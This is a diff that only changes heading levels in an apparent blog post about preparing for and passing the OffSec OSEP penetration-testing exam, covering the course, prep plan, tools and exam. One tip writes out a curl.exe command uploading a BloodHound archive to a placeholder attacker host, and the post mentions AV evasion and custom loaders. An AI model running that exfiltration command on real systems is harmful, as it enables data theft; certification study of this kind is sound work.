@@ -14,7 +14,7 @@ Here I'll share my personal experience preparing for this exam.
 > [!NOTE] spoiler
 > There will be no *spoilers* here. It's just my personal experience, without anything that isn't already public.
 
-### os-what?
+## os-what?
 The [Offensive Security Experienced Pentester (OSEP)](https://www.offsec.com/courses/pen-300/) from OffSec is probably the most advanced active directory penetration testing cert, along with the [Certified Active Directory Pentesting Expert (CAPE)](https://academy.hackthebox.com/preview/certifications/htb-certified-active-directory-pentesting-expert) from HackTheBox[^1].
 
 [PEN-300: Advanced Penetration Testing (PEN-300)](https://www.offsec.com/courses/pen-300/) is the course behind the OSEP certification, and it covers a wide range of internal penetration testing skills and techniques, including:
@@ -28,7 +28,7 @@ The [Offensive Security Experienced Pentester (OSEP)](https://www.offsec.com/cou
 * perform advanced exploitation of Microsoft SQL and Active Directory
 * use advanced programming concepts and Win32 APIs for attack development
 
-### the course
+## the course
 Overall, the course is pretty well put together. The content is easy to follow and goes in-depth on relevant topics. Some sections aren't strictly required for the exam, but it's super helpful to know what's under the hood.
 
 Fun fact: I managed to [escalate a sqli to an rce](/escalating-preauth-sqli-to-rce) in a real engagement thanks to studying this cert. So just for that, I guess it was worth it, kek.
@@ -47,14 +47,14 @@ Fun fact: I managed to [escalate a sqli to an rce](/escalating-preauth-sqli-to-r
 - **some av bypasses are too naïve**, e.g. vanilla process hollowing would get caught by Crowdstrike or any other competent EDR. That said, EDR evasion is a demanding field that requires constant updates, and this course does provide a solid baseline.
 - **phishing is mostly vba macros and hta**: both are a bit outdated (macros are disabled by default now) and easy to detect.
 
-### reqs
+## reqs
 IMHO, the following skills matter:
 - **ad hacking**: being familiar with the core concepts and common offensive techniques.
 - **programming background**: being fluent with c# and powershell.
 - **ctf experience**: if you don't have some background pwning boxes, you will struggle.
 - **windows internals**: nothing crazy, but knowing winapi, process and filesystem structure, etc. helps.
 
-### prep
+## prep
 I prepped for 1.5 months, and this was my strategy:
 1. reviewed external content listed in [references](#references).
 2. watched a selection of the course videos at 2x speed. Just the most challenging topics.
@@ -62,7 +62,7 @@ I prepped for 1.5 months, and this was my strategy:
 4. pwned the first 5 challenges. Thoroughly. Investigating all possible attack paths, e.g. dropper vs loader.
 5. re-reviewed my challenge solutions and forced myself to understand \*all\* the concepts behind the techniques: if you fall down a rabbit hole and treat everything as a black box, you're asking for trouble.
 
-### r4nd0m tips
+## r4nd0m tips
 - you can compile with [mono](https://www.mono-project.com/) to avoid visual studio. I basically managed to compile everything in kali and didn't touch the windows lab machine[^3]!
 - change the name of the artifacts because they don't necessarily overwrite![^2]
 - [updog](https://github.com/sc0tfree/updog) is god. You can host files but also exfil like: `curl.exe http://attackerip/upload -F "file=@C:\Windows\tasks\20260415044445_BloodHound.zip" -F "path=./"`.
@@ -74,7 +74,7 @@ I prepped for 1.5 months, and this was my strategy:
 - have a plan z: there are too many variables involved, so if something fails, you need to know different alternatives.
 - take good notes before and \*during\* the exam. The environment is huge and you can get lost/overwhelmed easily.
 
-### resources
+## resources
 I came across a ton of resources, but here's a curated list of the most practical ones.
 
 OSEP-specific resources sorted by subjective usefulness:
@@ -96,7 +96,7 @@ Related off-topic resources:
 Not strictly required, but the book _"Evading EDR"_ from No Starch Press is 🔥:
 ![Evading EDR book](/assets/img/evading-edr.jpeg)
 
-### my gig
+## my gig
 Here was my arsenal of tools[^6]:
 - **external recon**: [autorecon](https://github.com/AutoRecon/AutoRecon)
 - **c2**: keep calm and use [meterpreter](https://www.offsec.com/metasploit-unleashed/) (with custom c# loaders aligned with the book's content)
@@ -118,7 +118,7 @@ And my kali setup:
 - **rdp client**: [remmina](https://remmina.org/)
 - **browser extension**: [Bye Bye, Google AI: Turn off Google AI Overviews, Discussions and Ads](https://chromewebstore.google.com/detail/bye-bye-google-ai-turn-of/imllolhfajlbkpheaapjocclpppchggc?pli=1)
 
-### exam
+## exam
 
 As you may already know, OffSec advanced exams give you 48h for the technical part and 24h to write the report. I knew it was going to be *intense*.
 
@@ -373,7 +373,7 @@ I asked Claude to create this fun timeline of my exam progress:
   });
 </script>
 
-### wh00t wh00t
+## wh00t wh00t
 
 Two days after the exam I received the beloved email from OffSec. I passed! Yay!
 
